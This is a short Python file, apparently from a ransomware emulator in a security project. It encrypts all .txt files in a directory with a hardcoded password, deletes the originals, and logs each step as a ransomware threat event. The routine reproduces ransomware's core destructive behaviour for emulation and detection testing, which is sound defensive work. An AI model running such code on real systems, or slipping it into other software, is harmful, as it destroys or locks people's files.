from pathlib import Path
import os
from apps.ransomeware_emulator.encryption import encrypt_file
from sentenialx.ai_core.logger import log_threat_event
import logging

logger = logging.getLogger("Payload:SampleEncrypt")

def sample_encrypt_payload(root: Path):
    """
    Encrypt all .txt files and log the activity.
    """
    for file_path in root.glob("*.txt"):
        encrypted_path = file_path.with_suffix(".enc")
        encrypt_file(file_path, encrypted_path, "beastmodepassword")
        os.remove(file_path)
        logger.info(f"Encrypted {file_path.name}")

        # Log threat
        log_threat_event(
            threat_type="ransomware_activity",
            source="sample_encrypt",
            payload=f"Encrypted {file_path.name}",
            confidence=0.97
        )
